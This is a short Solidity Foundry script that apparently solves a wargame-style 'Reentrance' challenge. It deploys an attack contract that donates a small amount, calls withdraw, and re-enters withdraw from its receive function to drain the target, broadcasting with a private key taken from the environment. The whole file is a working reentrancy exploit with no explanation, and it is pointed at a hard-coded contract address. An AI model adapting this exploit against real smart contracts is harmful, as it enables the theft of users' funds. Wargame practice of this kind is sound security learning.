// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import {Script} from "forge-std/Script.sol";

contract AttackContract {
    Reentrance reentrance;
    address owner;

    constructor(Reentrance _reentrance) public payable {
        reentrance = _reentrance;
        owner = msg.sender;
    }

    function attack() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        if (msg.sender != owner && address(reentrance).balance >= 0) {
            reentrance.withdraw(0.001 ether);
        }
    }
}

contract ReEntrancyAttack is Script {
    Reentrance public reentranceInstance = Reentrance(0x787Cb55BC359304FC04566B3b32aBE46611a8b69);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackContract attackContract = new AttackContract{ value: 0.001 ether }(reentranceInstance);

        attackContract.attack();

        vm.stopBroadcast();
    }
}